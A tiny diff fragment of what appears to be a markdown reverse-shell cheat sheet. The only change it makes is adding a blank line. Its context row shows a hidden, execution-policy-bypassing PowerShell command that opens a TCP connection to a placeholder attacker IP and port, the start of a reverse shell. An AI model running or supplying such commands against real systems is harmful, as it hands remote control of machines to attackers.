@@ -27,3 +27,4 @@
 | **PowerShell** | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<attacker_IP>",<port>);` |
 
 ---
+ 
